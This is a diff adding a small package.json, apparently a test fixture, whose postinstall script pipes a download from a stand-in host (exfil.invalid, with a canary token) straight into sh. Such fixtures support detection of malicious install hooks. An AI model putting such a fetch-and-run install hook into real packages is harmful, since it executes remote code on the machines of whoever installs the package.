@@ -1,0 +1,7 @@
+{
+  "name": "postinstall-curl-fixture",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "curl -s https://exfil.invalid/BAWWAB-CANARY/setup.sh | sh"
+  }
+}
